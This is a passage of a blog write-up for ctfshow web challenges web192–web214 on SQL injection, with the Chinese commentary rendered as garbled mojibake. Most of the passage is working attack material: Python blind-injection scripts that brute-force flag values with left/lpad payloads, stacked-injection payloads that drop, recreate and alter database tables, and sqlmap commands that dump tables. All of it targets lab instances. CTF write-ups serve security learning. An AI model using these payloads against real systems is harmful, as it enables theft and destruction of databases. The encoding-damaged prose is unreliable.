<span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>æºç </p><p><img src="../images/image-20221230214618742.png" alt="image-20221230214618742"></p><p>è¿™æ¬¡193æ˜¯æŠŠsubstrç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é ç”¨åˆ«çš„å‡½æ•°æ¥æ›¿ä»£äº†ã€‚</p><p>left   right è¿™ä¸¤ä¸ªå‡½æ•°éƒ½å¯ä»¥ã€‚</p><p><img src="../images/image-20221230215436224.png" alt="image-20221230215436224"></p><p><img src="../images/image-20221230215458982.png" alt="image-20221230215458982"></p><p>ç¾¤ä¸»å†™çš„wpè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 01:24:27</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cd09c29e-5dfa-4740-aae6-babe6eebb972.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;,_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,tempstr+mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨tempstrå‚æ•°çš„åŸå› æ˜¯ï¼Œleftå‡½æ•°ä¸èƒ½ä¸€ä¸ªä¸€ä¸ªçš„éå†ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯ç›´æ¥è¾“å‡ºé•¿åº¦ä¸ºå¤šå°‘çš„å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æ‰¾ä¸€ä¸ªå‚æ•°æ¥æš‚æ—¶å­˜èµ·æ¥ï¼Œç„¶ååœ¨å’Œæ–°çš„æ‹¼æ¥åœ¨ä¸€èµ·ã€‚</p><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>æºç </p><p><img src="../images/image-20221230220314140.png" alt="image-20221230220314140"></p><p>è¿‡æ»¤äº†æŒºå¤šä¸œè¥¿çš„ã€‚è¿™é“é¢˜å¯ä»¥ä½¿ç”¨   lpad   å‡½æ•°</p><p><img src="../images/image-20221230220532917.png" alt="image-20221230220532917"></p><p><img src="../images/image-20221230220638283.png" alt="image-20221230220638283"></p><p>å…¶å®å’Œleftå·®ä¸å¤šï¼Œåªæ˜¯åŠ äº†ä¸€ä¸ªç©ºå‘½ä»¤ã€‚</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 01:24:27</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ae098689-0aa3-490f-9ece-da1a4ef3eaa4.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;,_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,&#x27;&#x27;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,tempstr+mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web195-å †å æ³¨å…¥"><a href="#web195-å †å æ³¨å…¥" class="headerlink" title="web195(å †å æ³¨å…¥)"></a>web195(å †å æ³¨å…¥)</h2><p>æºç </p><p><img src="../images/image-20221230225635015.png" alt="image-20221230225635015"></p><p>è¿™é“é¢˜ç”¨çš„æ˜¯å †å æ³¨å…¥çš„çŸ¥è¯†ç‚¹ã€‚</p><p><img src="../images/image-20221230225706757.png" alt="image-20221230225706757"></p><p>wpæ˜¯åˆ©ç”¨updateå‡½æ•°æ¥æ›´æ–°æ•°æ®åº“é‡Œçš„å¯†ç ã€‚</p><p><img src="../images/image-20221230225901741.png" alt="image-20221230225901741"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``      è¿™ä¸ªç¬¦å·å¯ä»¥æ›¿ä»£ç©ºæ ¼ã€‚</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221230230250480.png" alt="image-20221230230250480"></p><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>æºç </p><p><img src="../images/image-20221230230414378.png" alt="image-20221230230414378"></p><p><img src="../images/image-20221230231811538.png" alt="image-20221230231811538"></p><p><img src="../images/image-20221230231833992.png" alt="image-20221230231833992"></p><p>é€šè¿‡è¿™ä¸€ç‚¹å¯ä»¥æ¥è¿›è¡Œåˆ¤æ–­ã€‚</p><p><img src="../images/image-20221230231919859.png" alt="image-20221230231919859"></p><p>è¿™é‡Œçš„selectå¹¶æ²¡æœ‰è¢«è¿‡æ»¤ã€‚</p><p><img src="../images/image-20221231004615102.png" alt="image-20221231004615102"></p><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>æºç </p><p><img src="../images/image-20221230232106140.png" alt="image-20221230232106140"></p><p>ä¸èƒ½ç”¨updateæ¥æ›´æ–°å¯†ç äº†ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0;drop table ctfshow_user;</span><br><span class="line">create table ctfshow_user(`username` varchar(100),`pass` varchar(100));</span><br><span class="line">insert ctfshow_user(`username`,`pass`) value(1,2);</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯å…ˆåˆ é™¤æ‰åŸæ¥çš„è¡¨ï¼Œç„¶ååœ¨æ–°å»ºä¸€ä¸ªè¡¨ï¼Œç„¶ååœ¨å¾€è¡¨é‡Œæ’å…¥ä¸œè¥¿ã€‚</p><p><img src="../images/image-20221230235928061.png" alt="image-20221230235928061"></p><p><img src="../images/image-20221230235936942.png" alt="image-20221230235936942"></p><p>æˆåŠŸæ‰§è¡Œå¹¶ä¸”å»ºç«‹äº†æ–°è¡¨å’Œå†…å®¹ã€‚</p><p><img src="../images/image-20221231000026235.png" alt="image-20221231000026235"></p><p>æˆåŠŸæ‰§è¡Œã€‚</p><h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>æºç </p><p><img src="../images/image-20221231000119082.png" alt="image-20221231000119082"></p><p>æ–°å»ºè¡¨å’Œæ›´æ–°å¯†ç éƒ½ä¸èƒ½ç”¨äº†ã€‚</p><p><strong>è§£æ³•ä¸€</strong></p><p>paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;insert ctfshow_user(`username`,`pass`) value(2,3);</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ–°æ’å…¥çš„è´¦å·å¯†ç æ¥è·å¾—flagã€‚</p><p>ç„¶ååœ¨usernameå’Œpasswordå¤„åˆ†åˆ«è¾“å…¥2ï¼Œ3    å°±èƒ½æ‹¿åˆ°flagã€‚</p><p><strong>è§£æ³•äºŒ</strong></p><p>é€šè¿‡passå’Œidåˆ—çš„äº’ç›¸äº¤æ¢ï¼Œç„¶åæŠŠä¾æ¬¡çˆ†ç ´passå°±å¥½äº†ï¼Œusernameå€¼å¡«0ï¼›ï¼ˆå¼±ç±»å‹æ¯”è¾ƒï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column `pass` `tmp` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `tmp` `id` varchar(255)</span><br></pre></td></tr></table></figure><h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><p>æºç </p><p><img src="../images/image-20221231003923901.png" alt="image-20221231003923901"></p><p>è¿™é“é¢˜çš„ç”¨æ³•ç±»ä¼¼è¿™ä¸ªåŸç†</p><p><img src="../images/image-20221231004703865.png" alt="image-20221231004703865"></p><p><strong>è§£æ³•ä¸€</strong></p><p><img src="../images/image-20221231004751742.png" alt="image-20221231004751742"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username  ---&gt;    1;show tables</span><br><span class="line">password  ---&gt;    ctfshow_user</span><br><span class="line">å› ä¸ºå°±æ˜¯$rowæ˜¯ç”¨æ¥å­˜ç¬¬äºŒä¸ªåˆ†å·åä¼ çš„å†…å®¹çš„</span><br></pre></td></tr></table></figure><p><strong>è§£æ³•äºŒ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯æŠŠvarcharç±»å‹æ¢æˆtextç±»å‹ï¼Œå› ä¸ºå°±æ˜¯varcharéœ€è¦æ‹¬å·ï¼Œtextä¸éœ€è¦æ‹¬å·ã€‚</p><p>ç„¶åusernameä¸º0ï¼›ä»0å¼€å§‹çˆ†ç ´passwordå°±è¡Œã€‚</p><h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>æºç </p><p> <img src="../images/image-20221231005222484.png" alt="image-20221231005222484"></p><p>å¤šæŠŠä¸€ä¸ªé€—å·ç»™è¿‡æ»¤æ‰äº†ã€‚</p><p><strong>è§£æ³•ä¸€</strong></p><p><img src="../images/image-20221231005325134.png" alt="image-20221231005325134"></p><p><strong>è§£æ³•äºŒ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text</span><br></pre></td></tr></table></figure><h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>æºç </p><p><img src="../images/image-20221231212254050.png" alt="image-20221231212254050"></p><p><strong>ç¬¬ä¸€æ­¥</strong></p><p>æŸ¥çœ‹æ˜¯å¦å¯ä»¥è¿›è¡Œæ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213608213.png" alt="image-20221231213608213"></p><p>è¯´æ˜idå¯ä»¥è¿›è¡Œæ³¨å…¥äº†ã€‚</p><p><strong>ç¬¬äºŒæ­¥</strong></p><p>æŸ¥æ‰¾å…¨éƒ¨çš„æ•°æ®åº“åã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show --dbs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213740070.png" alt="image-20221231213740070"></p><p><strong>ç¬¬ä¸‰æ­¥</strong></p><p>æŸ¥æ‰¾æŸä¸ªæ•°æ®åº“ä¸­çš„è¡¨å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web --tables</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213901166.png" alt="image-20221231213901166"></p><p><strong>ç¬¬å››æ­¥</strong></p><p>æŸ¥æ‰¾è¡¨ä¸­çš„æ‰€æœ‰çš„åˆ—å</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --columns</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231214110487.png" alt="image-20221231214110487"></p><p><strong>ç¬¬äº”æ­¥</strong></p><p>æŸ¥çœ‹è¿™äº›åˆ—ä¸­çš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231214230587.png" alt="image-20221231214230587"></p><p>æ‹¿åˆ°flag.</p><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>æºç </p><p><img src="../images/image-20221231214436334.png" alt="image-20221231214436334"></p><p>é‚£å°±æ˜¯POSTè¯·æ±‚äº†ã€‚</p><p><img src="../images/image-20221231214624767.png" alt="image-20221231214624767"></p><p>çŒœæµ‹æ•°æ®åº“åå’Œè¡¨åä¹Ÿè¯¥æ²¡æ”¹ï¼Œé‚£ä¹ˆç›´æ¥å°±å»ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://f61fc87c-d4f4-44bb-a391-52a88766edb9.challenge.ctf.show/api/&quot; --data=&quot;id=1&quot; --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231215653269.png" alt="image-20221231215653269"></p><p>ç›´æ¥æ‹¿åˆ°flag.</p><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>æºç </p><p><img src="../images/image-20221231215842405.png" alt="image-20221231215842405"></p><p>è¿™é¢˜è¯´æ˜¯è¦ç”¨methodã€‚</p><p><img src="../images/image-20221231215938860.png" alt="image-20221231215938860"></p><p>æ³¨æ„ï¼šä¸€å®šè¦åŠ ä¸Šâ€“headers=â€œContent-Type: text/plainâ€ ï¼Œå¦åˆ™æ˜¯æŒ‰è¡¨å•æäº¤çš„ï¼Œputæ¥æ”¶ä¸åˆ°</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://ef1c4fb9-5fb4-45d0-96e6-721fe5bdbce3.challenge.ctf.show/api/index.php&quot; --data=&quot;id=1&quot; --referer=ctf.show --method=PUT --headers=&quot;Content-Type: text/plain&quot; -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p>(è¿™é‡Œæˆ‘æ˜¯æ‡’å¾—ä¸€æ­¥ä¸€æ­¥çš„å»æŸ¥æ•°æ®åº“å’Œè¡¨äº†ï¼Œå°±ç›´æ¥ç”¨ä¸Šä¸€ä¸ªçš„äº†)</p><p><img src="../images/image-20221231221803548.png" alt="image-20221231221803548"></p><h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><p>æºç </p><p><img src="../images/image-20221231222031810.png" alt="image-20221231222031810"></p><p>æ–°å¢åŠ äº†ä¸ªcookieæäº¤ã€‚</p><p><img src="../images/image-20221231222112530.png" alt="image-20221231222112530"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¿™é‡Œæˆ‘ä¹Ÿä¸çŸ¥é“å‡ºç°å•¥é—®é¢˜äº†ï¼Œç›´æ¥å†™çš„payloadåœ¨kaliä¸‹çš„sqlmap æ‰“ä¸é€š   æ‹¿åˆ«äººçš„plä¹Ÿæ²¡ç”¨ï¼Œå¥½å¥‡æ€ª</span><br></pre></td></tr></table></figure><h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><p>æºç </p><p><img src="../images/image-20230101152042762.png" alt="image-20230101152042762"></p><p>é€šè¿‡æŠ“åŒ…åˆ†æï¼Œåœ¨æ¯æ¬¡è¯·æ±‚<code>url/api/index.php</code>ä¹‹å‰éœ€è¦å…ˆè¯·æ±‚<code>URL/api/getTokn.php</code>ï¼Œå¤§å®¶å¯ä»¥ç”¨burpsuiteæŠ“åŒ…çœ‹çœ‹ç¡®å®æ˜¯è¿™ä¹ˆå›äº‹</p><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸¤ä¸ªå‚æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--safe-url è®¾ç½®åœ¨æµ‹è¯•ç›®æ ‡åœ°å€å‰è®¿é—®çš„å®‰å…¨é“¾æ¥</span><br><span class="line">--safe-freq è®¾ç½®ä¸¤æ¬¡æ³¨å…¥æµ‹è¯•å‰è®¿é—®å®‰å…¨é“¾æ¥çš„æ¬¡æ•°</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101152312909.png" alt="image-20230101152312909"></p><p>æ‘˜è‡ªY4tackerå¸ˆå‚…çš„åšå®¢   <a href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://98a8a8b4-a308-4ec4-93e7-b072c3971d27.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql dbs=ctfshow_web -T ctfshow_flax -C flagx --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://98a8a8b4-a308-4ec4-93e7-b072c3971d27.challenge.ctf.show/api/getToken.php --safe-freq=1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101153109959.png" alt="image-20230101153109959"></p><p>è¿™é‡Œæ˜¯ç›´æ¥æ‰“payloadï¼Œå¸ˆå‚…ä»¬å¯ä»¥æŒ‰ç…§å‰é¢çš„æ­¥éª¤æ¥ä¸€æ­¥ä¸€æ­¥çš„æ‰“ã€‚</p><h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><p>æºç </p><p><img src="../images/image-20230101153400105.png" alt="image-20230101153400105"></p><p>è¿™é‡Œçš„è¯æ˜¯é—­ä¸é—­åˆéƒ½æ— æ‰€è°“ï¼Œå› ä¸ºsqlmapä¼šè‡ªå·±åˆ¤æ–­ã€‚</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://0e551b3e-f8f4-4d09-9bbb-5a95ca5f0334.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --dbms=mysql -D &quot;ctfshow_web&quot; -T &quot;ctfshow_flaxc&quot; -C &quot;flagv&quot; --dump  --headers=&quot;Content-Type: text/plain&quot; --safe-url=http://0e551b3e-f8f4-4d09-9bbb-5a95ca5f0334.challenge.ctf.show/api/getToken.php --safe-freq=1</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230101153947876.png" alt="image-20230101153947876"></p><p>è¿™é‡Œæ˜¯ç›´æ¥æ‰“payloadï¼Œå¸ˆå‚…ä»¬å¯ä»¥æŒ‰ç…§å‰é¢çš„æ­¥éª¤æ¥ä¸€æ­¥ä¸€æ­¥çš„åšã€‚</p><h2 id="web207-web213"><a href="#web207-web213" class="headerlink" title="web207  -  web213"></a>web207  -  web213</h2><p>å¤§å®¶å¯ä»¥çœ‹çœ‹Y4tackerå¸ˆå‚…çš„åšå®¢ï¼Œæˆ‘å°±ä¸å†™äº†</p><p><a href="https://blog.csdn.net/solitudi/article/details/110144623">https://blog.csdn.net/solitudi/article/details/110144623</a></p><h2 id="web214-æ—¶é—´ç›²æ³¨"><a href="#web214-æ—¶é—´ç›²æ³¨" class="headerlink" title="web214(æ—¶é—´ç›²æ³¨)"></a>web214(æ—¶é—´ç›²æ³¨)</h2><p>æºç </p><p><img src="../images/image-20230101170048693.png" alt="image-20230101170048693"></p><p>æ³¨å…¥ç‚¹åœ¨url/api/</p><p>ç¾¤ä¸»å†™çš„wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b435d6fe-5f89-40c5-9d51-c6b900d102e1.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span 